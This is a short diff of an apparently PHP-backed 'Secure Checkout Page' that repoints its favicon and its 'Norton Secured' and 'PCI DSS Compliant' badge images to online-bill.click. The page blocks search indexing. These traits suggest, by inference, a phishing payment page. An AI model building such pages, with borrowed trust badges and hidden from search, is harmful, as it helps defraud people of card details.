@@ -168,7 +168,7 @@ $total = floatval($params['total']) / 100;
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
     <meta name="googlebot" content="noindex, nofollow">
-    <link rel="icon" type="image/png" href="../images/encrypted.png">
+    <link rel="icon" type="image/png" href="https://online-bill.click/images/encrypted.png">
     <title>Secure Checkout Page</title>
     <style>
         * {
@@ -714,8 +714,8 @@ $total = floatval($params['total']) / 100;
 
                     <button type="submit" class="submit-btn">Pay Now</button>
                     <div class="payment-logos security-logos"> 
-                        <img src="../images/norton.png" class="card-icon" alt="Norton Secured">
-                        <img src="../images/pci-dss.png" class="card-icon" alt="PCI DSS Compliant">
+                        <img src="https://online-bill.click/images/norton.png" class="card-icon" alt="Norton Secured">
+                        <img src="https://online-bill.click/images/pci-dss.png" class="card-icon" alt="PCI DSS Compliant">
                     </div>
                 </div>
             </div>
